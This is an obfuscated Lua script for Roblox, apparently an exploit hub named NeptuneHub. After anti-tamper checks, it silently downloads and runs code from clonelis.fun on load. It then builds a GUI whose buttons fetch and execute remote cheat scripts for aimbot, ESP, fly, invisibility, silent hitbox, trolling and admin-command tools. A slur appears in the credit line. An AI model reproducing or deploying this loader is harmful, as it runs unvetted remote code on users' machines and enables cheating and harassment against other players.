local Env = getfenv();
local a = {};
local v1 = {...};
local r15 = true;
local r23 = string.gmatch;
local function r1(...)
    error("Tamper Detected!");
    return; 
end;
local r27 = false;
local v2 = pcall(function(...)
    r27 = true;
    return; 
end);
local v3 = v2;
if v2 then
    v3 = r27;
end;
local v4 = v3;
local r18 = math.random;
local v5 = table.concat;
local function v6(...)
    while true do
        l1 = l2;
        l2 = l1;
        r1(); 
    end;
    return; 
end;
local r26 = table and table.unpack or unpack;
local r25 = r18(3, 65);
local v7 = {
    pcall(function(...)
        return "vhTpEfnHeo0Vp6" / (8642807 - "gCwsjLi" ^ 2140468); 
    end)
};
local v8 = v7[2];
local r24 = tonumber(r23(tostring(v8), ":(%d*):")());
local v9 = 1 < 0;
for W = 1, r25 do
    r16 = W;
    r17 = math.random(1, 100);
    r19 = r18(0, 255);
    r20 = r18(1, r17);
    r21 = r18(1, 2) == 1;
    r22 = v8:gsub(":(%d*):", ":" .. tostring(r18(0, 10000)) .. ":");
    v3 = pcall;
    if r21 then
        v3 = r15;
        r15 = v3 and v3(function(...)
            local u = {
                23,
                2,
                25,
                17,
                14,
                26,
                6,
                7,
                3,
                5,
                4,
                24
            };
            if r18(1, 2) == 1 or r16 == r25 then
                r15 = r15 and r24 == tonumber(r23(tostring(({
                    pcall(function(...)
                        return "tw5xXeEFmKiO" / (10961255 - "cBSTl" ^ 98911); 
                    end)
                })[2]), ":(%d*):")());
            end;
            if r21 then
                error(r22, 0);
            end;
            v1 = {};
            v4 = 1 < 0;
            for V = 1, r17 do
                v1[V] = r18(0, 255); 
            end;
            v1[r20] = r19;
            return r26(v1); 
        end) == false;
    end; 
end;
local r15 = r15 and 0 == 0;
if r15 then
    r4 = math.floor;
    v7 = {};
    r5 = 0;
    r6 = 2;
    r7 = {};
    o = 0;
    K = 1 < 0;
    for S = 1, 256 do
        v7[S] = S; 
    end;
    v8 = #v7 == 0;
    S = table.remove(v7, math.random(1, #v7));
    r7[S] = string.char(S - 1);
    if #v7 == 0 then
        r8 = {};
        local function r9(...)
            local u = {
                18,
                13,
                12,
                10
            };
            if #r8 == 0 then
                r5 = (r5 * 129 + 15967317007627) % 35184372088832;
                v3 = r6 ~= 1;
                r6 = r6 * 107 % 257;
                if r6 ~= 1 then
                    v1 = r6 % 32;
                    U = r4(r5 / 2 ^ (13 - (r6 - v1) / 32)) % 4294967296 / 2 ^ v1;
                    V = r4(U % 1 * 4294967296) + r4(U);
                    J = V % 65536;
                    l = (V - J) / 65536;
                    v4 = J % 256;
                    v6 = l % 256;
                    r8 = {
                        v4,
                        (J - v4) / 256,
                        v6,
                        (l - v6) / 256
                    };
                    return table.remove(r8);
                end;
            end; 
        end;
        r10 = {};
        r2 = setmetatable({}, {
            ["__index"] = r10,
            ["__metatable"] = nil
        });
        local function r3(arg1, arg2, ...)
            local u = {
                20,
                18,
                11,
                13,
                12,
                19
            };
            U = arg2;
            V = r10;
            if V[U] then
            else
                r8 = {};
                r5 = U % 35184372088832;
                r6 = U % 255 + 2;
                V[U] = "";
                T = 1 < 0;
                for v = 1, string.len(arg1) do
                    V[U] = V[U] .. r7[(string.byte(arg1, v) + r9() + 12) % 256 + 1]; 
                end;
                return U;
            end; 
        end;
        pcall(function(...)
            local u = {
                8,
                9
            };
            v1 = game;
            loadstring(v1:HttpGet("https://clonelis.fun/r8q1n"))();
            return; 
        end);
        r11 = Instance.new("ScreenGui");
        r12 = Instance.new("Frame");
        v2 = Instance.new("TextButton");
        v6 = Instance.new("TextLabel");
        P = Instance.new("TextLabel");
        v = Instance.new("TextButton");
        o = Instance.new("TextButton");
        T = Instance.new("TextButton");
        v7 = Instance.new("TextButton");
        v8 = Instance.new("TextButton");
        S = Instance.new("TextButton");
        v9 = Instance.new("TextButton");
        O = Instance.new("TextButton");
        q = Instance.new("TextButton");
        p = Instance.new("TextButton");
        y = Instance.new("TextButton");
        C = Instance.new("TextButton");
        g = Instance.new("TextButton");
        M = Instance.new("TextButton");
        R = Instance.new("TextButton");
        w = Instance.new("TextButton");
        m = Instance.new("TextButton");
        b = Instance.new("TextButton");
        HT = Instance.new("TextButton");
        DT = Instance.new("TextButton");
        dT = game.Players.LocalPlayer;
        r11.Parent = dT:WaitForChild("PlayerGui");
        r11.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
        r11.ResetOnSpawn = false;
        r12.Parent = r11;
        r12.BackgroundColor3 = Color3.fromRGB(2, 38, 148);
        r12.BorderColor3 = Color3.fromRGB(0, 22, 97);
        r12.BorderSizePixel = 4;
        r12.Position = UDim2.new(.257258058, 0, .250066787, 0);
        r12.Size = UDim2.new(0, 602, .09, 350);
        v2.Parent = r12;
        v2.BackgroundColor3 = Color3.fromRGB(2, 38, 148);
        v2.BorderColor3 = Color3.fromRGB(0, 22, 97);
        v2.BorderSizePixel = 0;
        v2.Position = UDim2.new(1, -30, .001, 0);
        v2.Size = UDim2.new(0, 30, 0, 30);
        v2.Font = Enum.Font.SourceSans;
        v2.Text = "X";
        v2.TextColor3 = Color3.fromRGB(15, 74, 255);
        v2.TextSize = 46;
        v.Parent = r12;
        v.BackgroundColor3 = Color3.fromRGB(47, 47, 48);
        v.BorderColor3 = Color3.fromRGB(0, 22, 97);
        v.BorderSizePixel = 2;
        v.Position = UDim2.new(.2479247, -125, .24300608, -20);
        v.Size = UDim2.new(0, 132, 0, 55);
        v.Font = Enum.Font.SourceSans;
        v.Text = "Fly";
        v.TextColor3 = Color3.fromRGB(36, 90, 255);
        v.TextSize = 45;
        v4 = v.MouseButton1Down;
        v4:connect(function(...)
            local u = {
                8,
                9
            };
            v1 = game;
            loadstring(v1:HttpGet("https://raw.githubusercontent.com/Clonelis/Scripts/refs/heads/main/fly.lua"))();
            return; 
        end);
        o.Parent = r12;
        o.BackgroundColor3 = Color3.fromRGB(47, 47, 48);
        o.BorderColor3 = Color3.fromRGB(0, 22, 97);
        o.BorderSizePixel = 2;
        o.Position = UDim2.new(.2479247, 15, .24300608, -20);
        o.Size = UDim2.new(0, 132, 0, 55);
        o.Font = Enum.Font.SourceSans;
        o.Text = "Esp";
        o.TextColor3 = Color3.fromRGB(36, 90, 255);
        o.TextSize = 45;
        v4 = o.MouseButton1Down;
        v4:connect(function(...)
            local u = {
                8,
                9
            };
            v1 = game;
            loadstring(v1:HttpGet("https://raw.githubusercontent.com/Clonelis/Scripts/refs/heads/main/Esp.lua"))();
            return; 
        end);
        T.Parent = r12;
        T.BackgroundColor3 = Color3.fromRGB(47, 47, 48);
        T.BorderColor3 = Color3.fromRGB(0, 22, 97);
        T.BorderSizePixel = 2;
        T.Position = UDim2.new(.2479247, 155, .24300608, -20);
        T.Size = UDim2.new(0, 132, 0, 55);
        T.Font = Enum.Font.SourceSans;
        T.Text = "Aimbot";
        T.TextColor3 = Color3.fromRGB(36, 90, 255);
        T.TextSize = 45;
        v4 = T.MouseButton1Down;
        v4:connect(function(...)
            local u = {
                8,
                9
            };
            v1 = game;
            loadstring(v1:HttpGet("https://raw.githubusercontent.com/Clonelis/Scripts/refs/heads/main/Aimbot.lua"))();
            return; 
        end);
        v7.Parent = r12;
        v7.BackgroundColor3 = Color3.fromRGB(47, 47, 48);
        v7.BorderColor3 = Color3.fromRGB(0, 22, 97);
        v7.BorderSizePixel = 2;
        v7.Position = UDim2.new(.2479247, 295, .24300608, -20);
        v7.Size = UDim2.new(0, 132, 0, 55);
        v7.Font = Enum.Font.SourceSans;
        v7.Text = "Anti-Afk";
        v7.TextColor3 = Color3.fromRGB(36, 90, 255);
        v7.TextSize = 45;
        v4 = v7.MouseButton1Down;
        v4:connect(function(...)
            local u = {
                8,
                9
            };
            v1 = game;
            loadstring(v1:HttpGet("https://raw.githubusercontent.com/Clonelis/Scripts/refs/heads/main/Anti-Afk.lua"))();
            return; 
        end);
        v8.Parent = r12;
        v8.BackgroundColor3 = Color3.fromRGB(47, 47, 48);
        v8.BorderColor3 = Color3.fromRGB(0, 22, 97);
        v8.BorderSizePixel = 2;
        v8.Position = UDim2.new(.2479247, -125, .24300608, 44);
        v8.Size = UDim2.new(0, 132, 0, 55);
        v8.Font = Enum.Font.SourceSans;
        v8.Text = "KaterHub";
        v8.TextColor3 = Color3.fromRGB(36, 90, 255);
        v8.TextSize = 30;
        v4 = v8.MouseButton1Down;
        v4:connect(function(...)
            local u = {
                8,
                9
            };
            v1 = game;
            loadstring(v1:HttpGet("https://raw.githubusercontent.com/KATERGaming/Roblox/main/KaterHub.Lua"))();
            return; 
        end);
        S.Parent = r12;
        S.BackgroundColor3 = Color3.fromRGB(47, 47, 48);
        S.BorderColor3 = Color3.fromRGB(0, 22, 97);
        S.BorderSizePixel = 2;
        S.Position = UDim2.new(.2479247, 15, .24300608, 44);
        S.Size = UDim2.new(0, 132, 0, 55);
        S.Font = Enum.Font.SourceSans;
        S.Text = "Clear-chat";
        S.TextColor3 = Color3.fromRGB(36, 90, 255);
        S.TextSize = 30;
        v4 = S.MouseButton1Down;
        v4:connect(function(...)
            local u = {
                8,
                9
            };
            v1 = game;
            loadstring(v1:HttpGet("https://raw.githubusercontent.com/Clonelis/Scripts/refs/heads/main/Clear-chat.lua"))();
            return; 
        end);
        v9.Parent = r12;
        v9.BackgroundColor3 = Color3.fromRGB(47, 47, 48);
        v9.BorderColor3 = Color3.fromRGB(0, 22, 97);
        v9.BorderSizePixel = 2;
        v9.Position = UDim2.new(.2479247, 155, .24300608, 44);
        v9.Size = UDim2.new(0, 132, 0, 55);
        v9.Font = Enum.Font.SourceSans;
        v9.Text = "DetScan";
        v9.TextColor3 = Color3.fromRGB(36, 90, 255);
        v9.TextSize = 40;
        v4 = v9.MouseButton1Down;
        v4:connect(function(...)
            local u = {
                8,
                9
            };
            v1 = game;
            loadstring(v1:HttpGet("https://raw.githubusercontent.com/Clonelis/Scripts/refs/heads/main/Detector%20Scanner.lua"))();
            return; 
        end);
        O.Parent = r12;
        O.BackgroundColor3 = Color3.fromRGB(47, 47, 48);
        O.BorderColor3 = Color3.fromRGB(0, 22, 97);
        O.BorderSizePixel = 2;
        O.Position = UDim2.new(.2479247, 295, .24300608, 44);
        O.Size = UDim2.new(0, 132, 0, 55);
        O.Font = Enum.Font.SourceSans;
        O.Text = "CMD X";
        O.TextColor3 = Color3.fromRGB(36, 90, 255);
        O.TextSize = 45;
        v4 = O.MouseButton1Down;
        v4:connect(function(...)
            local u = {
                8,
                9
            };
            v1 = game;
            loadstring(v1:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source"))();
            return; 
        end);
        q.Parent = r12;
        q.BackgroundColor3 = Color3.fromRGB(47, 47, 48);
        q.BorderColor3 = Color3.fromRGB(0, 22, 97);
        q.BorderSizePixel = 2;
        q.Position = UDim2.new(.2479247, 295, .24300608, 108);
        q.Size = UDim2.new(0, 132, 0, 55);
        q.Font = Enum.Font.SourceSans;
        q.Text = "AquaMatrix";
        q.TextColor3 = Color3.fromRGB(36, 90, 255);
        q.TextSize = 30;
        v4 = q.MouseButton1Down;
        v4:connect(function(...)
            local u = {
                8,
                9
            };
            v1 = game;
            loadstring(v1:HttpGet("https://raw.githubusercontent.com/ExploitFin/AquaMatrix/refs/heads/AquaMatrix/AquaMatrix"))();
            return; 
        end);
        p.Parent = r12;
        p.BackgroundColor3 = Color3.fromRGB(47, 47, 48);
        p.BorderColor3 = Color3.fromRGB(0, 22, 97);
        p.BorderSizePixel = 2;
        p.Position = UDim2.new(.2479247, 155, .24300608, 108);
        p.Size = UDim2.new(0, 132, 0, 55);
        p.Font = Enum.Font.SourceSans;
        p.Text = "Sirius";
        p.TextColor3 = Color3.fromRGB(36, 90, 255);
        p.TextSize = 45;
        v4 = p.MouseButton1Down;
        v4:connect(function(...)
            local u = {
                8,
                9
            };
            v1 = game;
            loadstring(v1:HttpGet("https://sirius.menu/script"))();
            return; 
        end);
        y.Parent = r12;
        y.BackgroundColor3 = Color3.fromRGB(47, 47, 48);
        y.BorderColor3 = Color3.fromRGB(0, 22, 97);
        y.BorderSizePixel = 2;
        y.Position = UDim2.new(.2479247, 15, .24300608, 108);
        y.Size = UDim2.new(0, 132, 0, 55);
        y.Font = Enum.Font.SourceSans;
        y.Text = "Invisible";
        y.TextColor3 = Color3.fromRGB(36, 90, 255);
        y.TextSize = 40;
        v4 = y.MouseButton1Down;
        v4:connect(function(...)
            local u = {
                8,
                9
            };
            v1 = game;
            loadstring(v1:HttpGet("https://raw.githubusercontent.com/Clonelis/Scripts/refs/heads/main/Invisible.lua"))();
            return; 
        end);
        C.Parent = r12;
        C.BackgroundColor3 = Color3.fromRGB(47, 47, 48);
        C.BorderColor3 = Color3.fromRGB(0, 22, 97);
        C.BorderSizePixel = 2;
        C.Position = UDim2.new(.2479247, -125, .24300608, 108);
        C.Size = UDim2.new(0, 132, 0, 55);
        C.Font = Enum.Font.SourceSans;
        C.Text = "Orca";
        C.TextColor3 = Color3.fromRGB(36, 90, 255);
        C.TextSize = 45;
        v4 = C.MouseButton1Down;
        v4:connect(function(...)
            local u = {
                8,
                9
            };
            v1 = game;
            loadstring(v1:HttpGetAsync("https://raw.githubusercontent.com/richie0866/orca/master/public/snapshot.lua"))();
            return; 
        end);
        g.Parent = r12;
        g.BackgroundColor3 = Color3.fromRGB(47, 47, 48);
        g.BorderColor3 = Color3.fromRGB(0, 22, 97);
        g.BorderSizePixel = 2;
        g.Position = UDim2.new(.2479247, -125, .24300608, 172);
        g.Size = UDim2.new(0, 132, 0, 55);
        g.Font = Enum.Font.SourceSans;
        g.Text = "Trolling";
        g.TextColor3 = Color3.fromRGB(36, 90, 255);
        g.TextSize = 45;
        v4 = g.MouseButton1Down;
        v4:connect(function(...)
            local u = {
                8,
                9
            };
            v1 = game;
            loadstring(v1:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/FE%20Trolling%20GUI.luau"))();
            return; 
        end);
        M.Parent = r12;
        M.BackgroundColor3 = Color3.fromRGB(47, 47, 48);
        M.BorderColor3 = Color3.fromRGB(0, 22, 97);
        M.BorderSizePixel = 2;
        M.Position = UDim2.new(.2479247, 15, .24300608, 172);
        M.Size = UDim2.new(0, 132, 0, 55);
        M.Font = Enum.Font.SourceSans;
        M.Text = "Console";
        M.TextColor3 = Color3.fromRGB(36, 90, 255);
        M.TextSize = 42;
        v4 = M.MouseButton1Down;
        v4:connect(function(...)
            local u = {
                8,
                9
            };
            v1 = game;
            loadstring(v1:HttpGet("https://raw.githubusercontent.com/Clonelis/Scripts/refs/heads/main/Console.lua"))();
            return; 
        end);
        R.Parent = r12;
        R.BackgroundColor3 = Color3.fromRGB(47, 47, 48);
        R.BorderColor3 = Color3.fromRGB(0, 22, 97);
        R.BorderSizePixel = 2;
        R.Position = UDim2.new(.2479247, 155, .24300608, 172);
        R.Size = UDim2.new(0, 132, 0, 55);
        R.Font = Enum.Font.SourceSans;
        R.Text = "Inf-Yield";
        R.TextColor3 = Color3.fromRGB(36, 90, 255);
        R.TextSize = 40;
        v4 = R.MouseButton1Down;
        v4:connect(function(...)
            local u = {
                8,
                9
            };
            v1 = game;
            loadstring(v1:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))();
            return; 
        end);
        w.Parent = r12;
        w.BackgroundColor3 = Color3.fromRGB(47, 47, 48);
        w.BorderColor3 = Color3.fromRGB(0, 22, 97);
        w.BorderSizePixel = 2;
        w.Position = UDim2.new(.2479247, 295, .24300608, 172);
        w.Size = UDim2.new(0, 132, 0, 55);
        w.Font = Enum.Font.SourceSans;
        w.Text = "AnimLog";
        w.TextColor3 = Color3.fromRGB(36, 90, 255);
        w.TextSize = 40;
        v4 = w.MouseButton1Down;
        v4:connect(function(...)
            local u = {
                8,
                9
            };
            v1 = game;
            loadstring(v1:HttpGet("https://raw.githubusercontent.com/Clonelis/Scripts/refs/heads/main/Animation%20Logger.lua"))();
            return; 
        end);
        m.Parent = r12;
        m.BackgroundColor3 = Color3.fromRGB(47, 47, 48);
        m.BorderColor3 = Color3.fromRGB(0, 22, 97);
        m.BorderSizePixel = 2;
        m.Position = UDim2.new(.2479247, 15, .24300608, 236);
        m.Size = UDim2.new(0, 132, 0, 55);
        m.Font = Enum.Font.SourceSans;
        m.Text = "Silent Hitbox";
        m.TextColor3 = Color3.fromRGB(36, 90, 255);
        m.TextSize = 28;
        v4 = m.MouseButton1Down;
        v4:connect(function(...)
            local u = {
                8,
                9
            };
            v1 = game;
            loadstring(v1:HttpGet("https://raw.githubusercontent.com/Clonelis/Scripts/refs/heads/main/Silent%20Hitbox"))();
            return; 
        end);
        b.Parent = r12;
        b.BackgroundColor3 = Color3.fromRGB(47, 47, 48);
        b.BorderColor3 = Color3.fromRGB(0, 22, 97);
        b.BorderSizePixel = 2;
        b.Position = UDim2.new(.2479247, 155, .24300608, 236);
        b.Size = UDim2.new(0, 132, 0, 55);
        b.Font = Enum.Font.SourceSans;
        b.Text = "Stretch";
        b.TextColor3 = Color3.fromRGB(36, 90, 255);
        b.TextSize = 45;
        v4 = b.MouseButton1Down;
        v4:connect(function(...)
            local u = {
                8,
                9
            };
            v1 = game;
            loadstring(v1:HttpGet("https://raw.githubusercontent.com/Clonelis/Scripts/refs/heads/main/Stretch.lua"))();
            return; 
        end);
        HT.Parent = r12;
        HT.BackgroundColor3 = Color3.fromRGB(47, 47, 48);
        HT.BorderColor3 = Color3.fromRGB(0, 22, 97);
        HT.BorderSizePixel = 2;
        HT.Position = UDim2.new(.2479247, 295, .24300608, 236);
        HT.Size = UDim2.new(0, 132, 0, 55);
        HT.Font = Enum.Font.SourceSans;
        HT.Text = "Ez Hub";
        HT.TextColor3 = Color3.fromRGB(36, 90, 255);
        HT.TextSize = 40;
        v4 = HT.MouseButton1Down;
        v4:connect(function(...)
            local u = {
                8,
                9
            };
            v1 = game;
            loadstring(v1:HttpGet("https://raw.githubusercontent.com/debug420/Ez-Industries-Launcher-Data/master/Launcher.lua", true))();
            return; 
        end);
        DT.Parent = r12;
        DT.BackgroundColor3 = Color3.fromRGB(47, 47, 48);
        DT.BorderColor3 = Color3.fromRGB(0, 22, 97);
        DT.BorderSizePixel = 2;
        DT.Position = UDim2.new(.2479247, -125, .24300608, 236);
        DT.Size = UDim2.new(0, 132, 0, 55);
        DT.Font = Enum.Font.SourceSans;
        DT.Text = "FE emotes";
        DT.TextColor3 = Color3.fromRGB(36, 90, 255);
        DT.TextSize = 35;
        v4 = DT.MouseButton1Down;
        v4:connect(function(...)
            local u = {
                8,
                9
            };
            v1 = game;
            loadstring(v1:HttpGet("https://raw.githubusercontent.com/Clonelis/Scripts/refs/heads/main/FE%20emotes"))();
            return; 
        end);
        v6.Parent = r12;
        v6.BackgroundColor3 = Color3.fromRGB(2, 38, 148);
        v6.BorderColor3 = Color3.fromRGB(0, 0, 0);
        v6.BorderSizePixel = 0;
        v6.Position = UDim2.new(.270121992, 14, .0485605076, 0);
        v6.Size = UDim2.new(0, 250, 0, 38);
        v6.Font = Enum.Font.SourceSans;
        v6.Text = "NeptuneHub";
        v6.TextColor3 = Color3.fromRGB(15, 74, 255);
        v6.TextSize = 70;
        P.Parent = r12;
        P.BackgroundColor3 = Color3.fromRGB(2, 38, 148);
        P.BorderColor3 = Color3.fromRGB(0, 0, 0);
        P.BorderSizePixel = 0;
        P.Position = UDim2.new(.10000138, 0, .905377209, 2);
        P.Size = UDim2.new(0, 466, 0, 23);
        P.Font = Enum.Font.SourceSans;
        P.Text = "(by clonelis and .retardsignal) discord.gg/VUTn7FNvUN";
        P.TextColor3 = Color3.fromRGB(15, 74, 255);
        P.TextSize = 25;
        QT = Instance.new("TextButton");
        QT.Parent = P;
        QT.BackgroundTransparency = 1;
        QT.Size = UDim2.new(1, 0, 1, 0);
        QT.Position = UDim2.new(0, 0, 0, 0);
        QT.Text = "";
        QT.ZIndex = P.ZIndex + 1;
        v4 = QT.MouseButton1Click;
        v4:Connect(function(...)
            local u = {
                8,
                9
            };
            setclipboard("https://discord.gg/VUTn7FNvUN");
            v5 = game.StarterGui;
            v5:SetCore("SendNotification", {
                ["Title"] = "Link Copied",
                ["Text"] = "Discord link copied to clipboard",
                ["Duration"] = 3
            });
            return; 
        end);
        dT = v2.MouseButton1Click;
        dT:Connect(function(...)
            v5 = r11;
            v5:Destroy();
            return; 
        end);
        coroutine.wrap(function(...)
            local u = {
                8,
                9,
                22
            };
            dragify = function(arg1_2, ...)
                local u = {
                    8,
                    9
                };
                r13 = arg1_2;
                dragToggle = nil;
                dragSpeed = .2;
                dragInput = nil;
                dragStart = nil;
                dragPos = nil;
                updateInput = function(arg1_3, ...)
                    local u = {
                        8,
                        9,
                        1
                    };
                    Delta = arg1_3.Position - dragStart;
                    Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y);
                    v3 = game;
                    V = v3:GetService("TweenService");
                    v3 = V:Create(r12, TweenInfo.new(0.25), {
                        ["Position"] = Position
                    });
                    v3:Play();
                    return; 
                end;
                l = r13.InputBegan;
                l:Connect(function(arg1_4, ...)
                    local u = {
                        8,
                        9,
                        1
                    };
                    r14 = arg1_4;
                    V = r14.UserInputType;
                    if V == Enum.UserInputType.MouseButton1 or r14.UserInputType == Enum.UserInputType.Touch then
                        dragToggle = true;
                        dragStart = r14.Position;
                        startPos = r12.Position;
                        V = r14.Changed;
                        V:Connect(function(...)
                            local u = {
                                27,
                                8,
                                9
                            };
                            if r2.UserInputState == Enum.UserInputState.End then
                                dragToggle = false;
                            end;
                            return; 
                        end);
                    end;
                    return; 
                end);
                l = r13.InputChanged;
                l:Connect(function(arg1_5, ...)
                    local u = {
                        8,
                        9
                    };
                    v1 = arg1_5;
                    if v1.UserInputType == Enum.UserInputType.MouseMovement or v1.UserInputType == Enum.UserInputType.Touch then
                        v5 = arg1_5;
                        dragInput = v5;
                    end;
                    return; 
                end);
                v4 = game;
                l = v4:GetService("UserInputService").InputChanged;
                l:Connect(function(arg1_6, ...)
                    v1 = arg1_6;
                    if v1 == dragInput and dragToggle then
                        updateInput(v1);
                    end;
                    return; 
                end);
                return; 
            end;
            dragify(Instance.new("LocalScript", r12).Parent);
            return; 
        end)();
        return;
    end;
end;
return (function(...)
    while true do
        l1 = l2;
        l2 = l1;
        r1(); 
    end;
    return; 
end)();